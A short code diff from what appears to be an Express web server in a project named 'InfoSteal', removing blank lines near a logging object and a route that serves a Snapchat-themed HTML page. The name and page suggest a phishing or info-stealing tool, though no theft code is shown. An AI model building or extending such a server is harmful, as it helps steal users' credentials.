@@ -34,8 +34,6 @@ setInterval(function() {
 
 */
 
-
-
 //Logging functions
 var log = {
     error: function(data) {
@@ -117,9 +115,7 @@ app.get('/snapchat/*', function(req, res){
   res.sendFile('/home/ubuntu/InfoSteal/web/snapchat.html')
 })
 
-
 /*
-
 //HTTP AUTH EXAMPLE
 app.get('/auth', function(req, res) {
     var credentials = auth(req)
